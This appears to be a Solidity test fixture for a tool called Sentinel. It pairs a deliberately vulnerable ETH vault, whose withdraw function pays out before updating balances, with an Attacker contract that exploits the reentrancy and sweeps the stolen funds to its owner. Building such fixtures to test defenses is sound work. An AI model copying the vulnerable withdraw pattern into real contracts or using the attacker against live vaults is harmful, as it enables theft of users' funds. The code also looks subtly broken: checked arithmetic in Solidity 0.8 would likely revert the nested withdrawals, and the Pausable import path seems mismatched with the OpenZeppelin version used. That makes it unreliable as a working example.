// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title VulnerableVault
 * @notice A deliberately vulnerable vault for testing Sentinel's protection
 * @dev This contract has a reentrancy vulnerability in the withdraw function
 */
contract VulnerableVault is Pausable, Ownable {
    
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);
    
    constructor() Ownable(msg.sender) {}
    
    /**
     * @notice Deposit ETH into the vault
     */
    function deposit() external payable whenNotPaused {
        require(msg.value > 0, "Must deposit something");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    /**
     * @notice Withdraw ETH from the vault
     * @dev VULNERABLE: External call before state update (reentrancy)
     */
    function withdraw(uint256 amount) external whenNotPaused {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // VULNERABILITY: External call BEFORE state update
        // This allows reentrancy attacks
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // State update happens AFTER external call (wrong!)
        balances[msg.sender] -= amount;
        
        emit Withdraw(msg.sender, amount);
    }
    
    /**
     * @notice Get contract balance
     */
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @notice Get user balance
     */
    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }
    
    // Allow receiving ETH
    receive() external payable {
        balances[msg.sender] += msg.value;
    }
}

/**
 * @title Attacker
 * @notice Contract to simulate reentrancy attacks on VulnerableVault
 */
contract Attacker {
    VulnerableVault public target;
    address public owner;
    uint256 public attackAmount;
    uint256 public reentrancyCount;
    
    constructor(address _target) {
        target = VulnerableVault(_target);
        owner = msg.sender;
    }
    
    /**
     * @notice Start the reentrancy attack
     */
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        attackAmount = msg.value;
        reentrancyCount = 0;
        
        // Deposit first
        target.deposit{value: msg.value}();
        
        // Then withdraw (triggers reentrancy)
        target.withdraw(msg.value);
    }
    
    /**
     * @notice Receive function that reenters the vault
     */
    receive() external payable {
        reentrancyCount++;
        
        // Reenter up to 5 times to prevent infinite loop
        if (reentrancyCount < 5 && address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }
    
    /**
     * @notice Withdraw stolen funds
     */
    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Only owner");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
